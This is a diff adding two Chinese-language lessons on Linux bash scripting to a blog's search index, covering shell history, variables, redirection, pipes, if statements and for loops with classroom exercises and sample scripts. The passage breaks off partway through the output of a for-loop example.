@@ -2762,6 +2762,688 @@
       </tags>
   </entry>
   <entry>
+    <title>LINUX Shell Scripts 第一课 简介和变量</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/</url>
+    <content><![CDATA[<h2 id="教学环境介绍"><a href="#教学环境介绍" class="headerlink" title="教学环境介绍"></a>教学环境介绍</h2><ul>
+<li>client rhel7.2 172.25.0.10</li>
+<li>server rhel7.2 172.25.0.11</li>
+</ul>
+<p>如果真的想走IT这条路，想真正管理好你的主机，那么学习自动化管理工具Shell Scripts 非常重要！</p>
+<p>就是将一些命令放在一起去执行，并且不需要编译就能执行，很方便，所以在日常工作中可以用shell scripts来简化我们的管理。可以但到我们linux中，很多服务的启动都是透过shell脚本来启动的。</p>
+<p>如果你不会脚本，那么服务器出问题的时候，真的会求助无门，所以好好地学习吧！</p>
+<h2 id="shell-简介"><a href="#shell-简介" class="headerlink" title="shell 简介"></a>shell 简介</h2><h3 id="什么是-shell"><a href="#什么是-shell" class="headerlink" title="什么是 shell"></a>什么是 shell</h3><p>Shell 是一个命令解释器 , 是人与操作系统之间的桥梁。</p>
+<p><img src="pic/03.png" alt="03.png"></p>
+<p>我们平时无论任何操作 , 最终都要操作硬件 , 比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板 , 通过主板总线传递到内存 ,CPU, 显卡等 , 最终经过显卡的运 算完成后在屏幕的某个位置 , 显示一个特定字体的字符 “a ”, 这一整个过程可以说是 不断的和硬件打交道了 , 但是如果让人去发送这些硬件操作码显然不适合 , 因为这不是人干 的事 , 所以我们有了操作系统 , 操作系统通过加载一定的硬件驱动 , 从而控制硬件 , 操作硬 件 , 那剩下的事就是如何和操作系统通信了 , 对于普通的系统管理员来说 , 这也是一件非常 困难的事 , 为了方便人和操作系统沟通 , 我们开发了 shell 。</p>
+<p>Shell 可以将我们平时运行的一些指令解释给操作系统执行 , 方便管理员操作系统。 而 Shell 的脚本其实是一种命令的堆积 , 我们将所有需要执行的命令 , 以从上至下的方 式写在一个文件当中 , 交给 shell 去自动解释执行。</p>
+<h3 id="shell-历史"><a href="#shell-历史" class="headerlink" title="shell 历史"></a>shell 历史</h3><p>在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候 , 他们想要为 用户创建一种与他们的新系统交流的方法。 那时的操作系统带有命令解释器。命令解释器接受用户的命令 , 然后解释它们 , 因而计 算机可以使用这些命令。</p>
+<p>但是 Ritchie 和 Thompson 想要的不只是这些功能 , 他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell( 通称为 sh) 的开发 , 由 S.R. Bourne 创 建。自从 Bourne shell 的创建 , 其它 shell 也被一一开发 , 如 C shell(csh) 和 Korn shell(ksh) 。</p>
+<p>当自由软件基金会想寻求一种免费的 shell, 开发者们开始致力于 Bourne shell 以及当 时其它 shell 中某些很受欢迎的功能背后的语言。</p>
+<p>这个开发结果是 Bourne Again Shell, 或称 bash 。虽然你的 Red Hat Linux 包括几 种不同的 shell,bash 是为互动用户提供的默认 shell 。</p>
+<h3 id="常见的-shell"><a href="#常见的-shell" class="headerlink" title="常见的 shell"></a>常见的 shell</h3><ul>
+<li>Bourne shell 即 sh:AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。</li>
+<li>C Shell :Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用 , 他把语法 结构变成了 C 语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。</li>
+<li>korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。</li>
+<li>Bourne-Again Shell: bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写 :Bourne-Again SHell — 这是关于 Bourne shell(sh) 的一个双关语 (Bourne again / born again) 。 Bourne shell 是一个早期的重要 shell, 由 Stephen Bourne 在 1978 年前后编写 , 并同 Version 7 Unix 一起发布。 bash 则在1987 年由 Brian Fox 创造。 在 1990 年 ,Chet Ramey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell, 它能运行于大多数 Unix 风格的操作系统之上 , 甚至被移植到了 MicrosoftWindows 上的 Cygwin 和 MSYS 系统中 , 以实现 windows 的 POSIX 虚拟接口。此外 , 它也被 DJGPP 项目移植到了 MS- DOS 上。</li>
+<li>POSIX shell :POSIX shell 与 Korn shell 非常的相似 , 当前提供 POSIX shell 的最 大卖主是 Hewlett-Packard 。</li>
+</ul>
+<h3 id="为什么-Shell"><a href="#为什么-Shell" class="headerlink" title="为什么 Shell"></a>为什么 Shell</h3><ul>
+<li>解决重复操作的作业。</li>
+<li>节约时间 , 提高工作效率。</li>
+<li>功能强大 , 使用简单。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.查看系统当中合法的shell</span></span><br><span class="line">cat /etc/shells</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">    /bin/sh</span><br><span class="line">    /bin/dash</span><br><span class="line">    /bin/bash</span><br><span class="line">    /bin/rbash</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.修改用户登录时使用的shell程序</span></span><br><span class="line">useradd batman</span><br><span class="line">chsh -s /bin/sh batman</span><br><span class="line">grep batman /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<pre><code>useradd: Permission denied.
+useradd: cannot lock /etc/passwd; try again later.
+chsh: user &apos;batman&apos; does not exist</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3.用户的登录流程</span></span><br><span class="line"></span><br><span class="line">![01](pic/01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 对于所有的用户HISTSIZE 500 ，对于root用户HISTSIZE 1000</span></span><br><span class="line">/etc/profile start</span><br><span class="line">/etc/profile end</span><br><span class="line"></span><br><span class="line">~/.bash_profile start</span><br><span class="line">~/.bashrc start</span><br><span class="line">/etc/bashrc start</span><br><span class="line"></span><br><span class="line">/etc/bashrc end</span><br><span class="line">~/.bashrc end</span><br><span class="line">~/.bash_profile end</span><br></pre></td></tr></table></figure>
+
+<h2 id="shell的变量功能"><a href="#shell的变量功能" class="headerlink" title="shell的变量功能"></a>shell的变量功能</h2><h3 id="什么是变量"><a href="#什么是变量" class="headerlink" title="什么是变量"></a>什么是变量</h3><ul>
+<li>让一个特定的字符代表不固定的内容，有点像y=ax+b,y就是变量，</li>
+<li>用简单的字眼来代替比较复杂或者容易变动的数据，好处就是方便！</li>
+</ul>
+<p>比如系统中的MAIL和USER变量，根据当前登陆的用户而变化</p>
+<ul>
+<li>对脚本的用处——例如ule考试的评分脚本，根据你们的机器号的不同，去检测不同的学生考试成绩</li>
+</ul>
+<h3 id="变量的设置、查看和取消-echo-unset"><a href="#变量的设置、查看和取消-echo-unset" class="headerlink" title="变量的设置、查看和取消 echo unset"></a>变量的设置、查看和取消 echo unset</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">        查看	echo $&#123;MAIL&#125;</span><br><span class="line">			echo $MAIL</span><br><span class="line">		设置	变量名=变量的内容</span><br><span class="line">				myname=booboo</span><br><span class="line">				myname="booboo wei"</span><br><span class="line">			注意事项</span><br><span class="line">				变量命名规则：</span><br><span class="line">					1.由数字，字母，下划线_组成</span><br><span class="line">					2.不能以数字开头</span><br><span class="line">					3.字母区分大小写，大小写敏感</span><br><span class="line">				变量内容若有空格，可以使用单引号或者双引号</span><br><span class="line">					双引号保留特殊字符原有属性</span><br><span class="line">					单引号特殊字符变一般字符（纯文本）</span><br><span class="line">					也可使用\跳脱字符将特殊字符变成一般字符</span><br><span class="line">				`指令`或$(指令)可以将指令的结果变成变量内容</span><br><span class="line">		取消	unset 变量名</span><br><span class="line">				unset myname</span><br><span class="line">```                </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 课堂练习</span></span></span><br><span class="line">			1. 设置变量myname=superman并查看变量的值；</span><br><span class="line">			2. 设置变量myname1=I am superman</span><br><span class="line">				myname2="I am superman"</span><br><span class="line">				myname3='I am superman'并查看所有变量的值；</span><br><span class="line">			3. 设置两个变量分别为name1="$myname is myname"和name2='$myname is myname';并查看变量的值；</span><br><span class="line">			4. 设置变量kernel的值为当前系统的内核版本号；</span><br><span class="line">			5. 设置变量num的值为/etc/目录下所有以.conf结尾的文件的总数；</span><br><span class="line">			6. 取消练习中的有所变量。</span><br><span class="line"></span><br><span class="line">![02](pic/02.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 变量内容的删除和替换</span></span></span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">		变量设定方式		说明</span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量<span class="comment">#关键词&#125;		若变量内容从头开始的数据符合『关键词』,则将符合的最短数据删除</span></span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量<span class="comment">##关键词&#125; 		若变量内容从头开始的数据符合『关键词』,则将符合的最长数据删除</span></span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量%关键词&#125; 		若变量内容从尾向前的数据符合『关键词』,则将符合的最短数据删除</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量%%关键词&#125;		若变量内容从尾向前的数据符合『关键词』,则将符合的最长数据删除</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量/旧字符串/新字符串&#125; 	若变量内容符合『旧字符串』则『第一个旧字符串会被新字符串替换』</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量//旧字符串/新字符串&#125;	若变量内容符合『旧字符串』则『全部的旧字符串会被新字符串替换』</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>设置变量path=${PATH} 并查看；</li>
+<li>设置变量path=/batman/bin:${path}:/superman/bin 并查看；</li>
+<li>读取变量的时候将/batman/bin:及第一个冒号及之前的删除；</li>
+<li>读取变量的时候将最后一个冒号及之前的都删除；</li>
+<li>读取变量的时候将:/superman/bin及最后一个冒号及之后的删除；</li>
+<li>读取变量的时候将第一个冒号及之后的都删除；</li>
+<li>读取变量的时候将第一个sbin替换成SBIN；</li>
+<li>读取变量的时候将所有的sbin替换成SBIN；</li>
+<li>取消练习中的path变量。</li>
+</ol>
+<h3 id="变量的分类：局部变量和全局变量-env-set-export"><a href="#变量的分类：局部变量和全局变量-env-set-export" class="headerlink" title="变量的分类：局部变量和全局变量 env set export"></a>变量的分类：局部变量和全局变量 env set export</h3><ul>
+<li>分类标准    变量是否会被子程序所继续引用；局部变量不会；全局变量会</li>
+<li>env     列出目前shell环境下的所有全局变量</li>
+<li>set     查看所有变量，包括环境变量和局部变量</li>
+<li>export    将局部变量转成全局变量    export myname</li>
+</ul>
+<h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 打开一个终端bash，查看该终端的pid号；
+2. 设置本地变量justice1=&quot;this is local&quot;并查看;
+3. 设置环境变量justice2=&quot;this is env&quot;并查看;
+4. 打开子终端bash，查看该终端的pid号和ppid号；
+5. 在子终端中分别查看变量justice1和justice2的值；</code></pre><h3 id="变量读取、数组与宣告-read-array-declare"><a href="#变量读取、数组与宣告-read-array-declare" class="headerlink" title="变量读取、数组与宣告 read array declare"></a>变量读取、数组与宣告 read array declare</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">read	从键盘读取数据存入变量</span><br><span class="line">	read -p "plz input yourname:" -t 30 name 按下回车输入变量name的值，会等待30s结束</span><br><span class="line">array</span><br><span class="line">	数组的设定	A[0]=1;A[1]=2;A[2]=3</span><br><span class="line">			A=(1 2 3)</span><br><span class="line">			A=(1 2 3 [50]=4)</span><br><span class="line">			A=(1 2 3 [50]=4 5)</span><br><span class="line">	数组的读取	echo $&#123;A[0]&#125;</span><br><span class="line">			echo $&#123;A[@]&#125;</span><br><span class="line">			echo $&#123;A[*]&#125;</span><br><span class="line">			* 代表的是一次取出所有的值 ,@ 代表依次取值</span><br><span class="line">				for i in "$A[@]";do echo $i;done</span><br><span class="line">				for i in "$A[*]";do echo $i;done</span><br><span class="line">declare</span><br><span class="line">	declare 参数</span><br><span class="line">		-a 将变量看成数组</span><br><span class="line">		-i 将变量看成整数</span><br><span class="line">		-r 使变量只读</span><br><span class="line">	x=1</span><br><span class="line">	y=2</span><br><span class="line">	sum=$(($x+$y))</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 用read命令从键盘读取num变量的值，提示语句为“请输入你的机器号：”，限时间20s；
+2. 设置数组S 第一位为1，第二位为2，第三十位为4，第三十一位为5，读取数组所有的值，读取数组第二位；
+3. 设置变量x=1，y=2，变量sum=$x+$y，查看sum的值；
+4. 宣告变量x为整数型值为1，变量y为整数型值为2,变量sum为整数型=$x+$y，查看sum的值；</code></pre><h2 id="数据流重导向redirection"><a href="#数据流重导向redirection" class="headerlink" title="数据流重导向redirection"></a>数据流重导向redirection</h2><h3 id="何谓数据流重导向"><a href="#何谓数据流重导向" class="headerlink" title="何谓数据流重导向"></a>何谓数据流重导向</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">指令执行后的结果有：</span><br><span class="line">          exit    命令执行是否正确的返回值?	0正确；！0错误		简称	代码	符号</span><br><span class="line">          return	命令执行输出的正确信息	standard output		    stdout	1	&gt;或者&gt;&gt;</span><br><span class="line">			命令执行输出的错误信息	standard error output	stderr	2	2&gt;或者2&gt;&gt;</span><br><span class="line">指令执行前的输入：		命令执行输入的信息		standard in		stdin	0	&lt;或者&lt;&lt;</span><br><span class="line"></span><br><span class="line">用法总结			</span><br><span class="line"><span class="meta">	1&gt;</span><span class="bash"> :以覆盖的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	1&gt;</span><span class="bash">&gt;:以追加的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	2&gt;</span><span class="bash"> :以覆盖的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	2&gt;</span><span class="bash">&gt;:以追加的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"></span><br><span class="line">cat	从键盘读取数据存入文件</span><br><span class="line">	cat &gt; /tmp/catfile 以ctrl+d结束</span><br><span class="line">	cat &gt; /tmp/catfile &lt; /tmp/passwd</span><br><span class="line">	cat &gt; /tmp/catfile &lt;&lt; ENDF</span><br><span class="line">	standard in</span><br><span class="line">	ENDF===&gt;结束提示符</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 查看系统/目录下的所有文件名和属性，并记录到/tmp/file文件中；
+2. 查看系统/var/目录下的所有文件名和属性，并追加记录到/tmp/file文件中；
+3. 切换到student用户，在/home目录下查找文件名为.bashrc的文件是否存在；
+4. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息显示到屏幕上，将该命令执行输出的错误信息放到黑洞/dev/null中；
+5. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中并查看，将该命令执行输出的错误信息放到黑洞/dev/null中；
+6. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中，将该命令执行输出的错误信息保存到/tmp/stderr文件中，并查看；
+7. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的所有信息（正确和错误）都保存到/tmp/all中，并查看；
+8. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件；
+9. 使用cat命令将/etc/passwd/的内容覆盖/tmp/catfile文件；
+10. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件，以结束提示符的方式结束；</code></pre><h3 id="命令执行的判断依据-amp-amp"><a href="#命令执行的判断依据-amp-amp" class="headerlink" title="命令执行的判断依据 ; &amp;&amp; ||"></a>命令执行的判断依据 ; &amp;&amp; ||</h3><ul>
+<li>CMD1 &amp;&amp; CMD2     如果前一个命令 (CMD1) 能够正确被执行 , 则执行后一个命令 (CMD2)</li>
+<li>CMD1 || CMD2     如果前一个命令 (CMD1) 被正确执行 , 则不执行后一个命令 (CMD2), 如果前一个命令(CMD1) 执行错误 , 则执行后一个命令 (CMD2).</li>
+<li>CMD1 ; CMD2    命令之间没有关系，从第一个开始执行，不管是否正确执行都会去执行第二个命令</li>
+</ul>
+<h4 id="课堂实验"><a href="#课堂实验" class="headerlink" title="课堂实验"></a>课堂实验</h4><pre><code>1. 创建目录/tmp/cmd,如果创建成功那么就再创建一个目录/tmp/cmd/cdm1;
+2. 创建目录/tmp/cmd,如果创建失败，那么就再船舰一个目录/tmp/cmd/cmd2;
+3. 不管目录/tmp/cmd是否创建成功，都会去再创建一个目录/tmp/tmpcmd;</code></pre><h3 id="管道命令pipe"><a href="#管道命令pipe" class="headerlink" title="管道命令pipe"></a>管道命令pipe</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">   #</span><span class="bash">截取 grep cut</span></span><br><span class="line">	grep bash$ /etc/passwd</span><br><span class="line">	cut -d : -f 3 /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">排序 sort uniq</span></span><br><span class="line">	sort -t: -k3 -n /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">统计 wc</span></span><br><span class="line">	wc -l /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">替换 xargs</span></span><br><span class="line">	find /sbin/ -perm +7000|wc -l</span><br><span class="line">	find /sbin/ -perm +7000|xargs wc -l</span><br><span class="line"></span><br><span class="line">	课堂练习：</span><br><span class="line">	1.找出/sbin/目录下有特殊权限的文件，并统计每个文件的行数</span><br><span class="line">	2.找出/sbin/目录下有特殊权限的文件，并统计有几个</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">减号 -</span></span><br><span class="line">	课堂练习：</span><br><span class="line">	1.将/home目录打包压缩后解压到/tmp目录</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="shell下的特殊符号"><a href="#shell下的特殊符号" class="headerlink" title="shell下的特殊符号"></a>shell下的特殊符号</h3><pre><code>#    注释符
+\    跳脱符
+|    管道
+;    连续指令的下达
+~    家目录
+$    取用变量符
+&amp;    进程控制后台运行
+!    逻辑运算非
+/    根目录
+&gt;,&gt;&gt;    数据流重导向 输出
+&lt;,&lt;&lt;    数据流重导向 输入
+&apos;&apos;    特殊字符失效
+&quot;&quot;    特殊字符有效
+``    命令执行的结果
+{}    命令的组合</code></pre>]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第二课 流程控制语句</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/</url>
+    <content><![CDATA[<ol>
+<li><p>shell 的基本组成元素</p>
+<ul>
+<li>1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。</li>
+<li>2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。</li>
+<li>3&gt; 系统命令 :shell 脚本中运行解释的系统命令。</li>
+<li>4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。</li>
+<li>5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。</li>
+</ul>
+</li>
+<li><p>执行脚本的方法</p>
+<ul>
+<li>1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本</li>
+<li>2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限</li>
+</ul>
+</li>
+<li><p>shell的基本语法</p>
+<ul>
+<li>条件判断语句     if test</li>
+<li>循环语句    for while unitl</li>
+<li>其他流程控制     case continue break shift function</li>
+</ul>
+</li>
+</ol>
+<h3 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h3><p>test 判断—————man test 查看的相关的判断指令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> 	数字的判断 	字符的判断 	文件的判断</span><br><span class="line">-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">-le 小于等于 	-n 非空 	</span><br><span class="line">-ne 不等于 	-a 逻辑与</span><br><span class="line">-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>
+<pre><code>注意 ：
+* [ ] 括号两边有空格
+* 判断符号两边有空格</code></pre><h3 id="if-语法格式"><a href="#if-语法格式" class="headerlink" title="if 语法格式"></a>if 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if condition	--&gt;condition 指的是判断的条件</span><br><span class="line">then		</span><br><span class="line">	CMD1	--&gt; CMD1 指的是满足判断条件后执行的语句</span><br><span class="line">else</span><br><span class="line">	CMD2	--&gt; CMD2 指的是不满足判断条件执行的语句 then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">	CMD1</span><br><span class="line">elif condition</span><br><span class="line">	CMD2</span><br><span class="line">else</span><br><span class="line">	CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。
+2. 三个数字比大小，输出最大的
+3. 三个数字比大小,并且按从大到小排列</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	n1=<span class="variable">$1</span></span><br><span class="line">	n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	n1=<span class="variable">$2</span></span><br><span class="line">	n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	max=<span class="variable">$n1</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		be=<span class="variable">$n2</span></span><br><span class="line">		min=<span class="variable">$3</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		be=<span class="variable">$3</span></span><br><span class="line">		min=<span class="variable">$n2</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	max=<span class="variable">$3</span></span><br><span class="line">	be=<span class="variable">$n1</span></span><br><span class="line">	min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="for-语法格式"><a href="#for-语法格式" class="headerlink" title="for 语法格式"></a>for 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for 变量 in 取值范围</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<h4 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围</h4><ul>
+<li><p>以空格分割</p>
+<pre><code>for i in 1 2 3
+for i in 5 7 10
+for i in a b c</code></pre><p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">	ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">	ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以{}罗列        {1..10}</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以使用seq	$(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">		&#96;seq 1 10&#96;</span><br><span class="line">		seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">		seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid”</li>
+<li>依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件</li>
+<li>输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些</li>
+<li>计算某个命令执行的时间</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 系统中一共有：`cat /etc/passwd |wc -l`个用户</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	username=<span class="variable">$i</span></span><br><span class="line">	uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">系统中一共有：22个用户</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 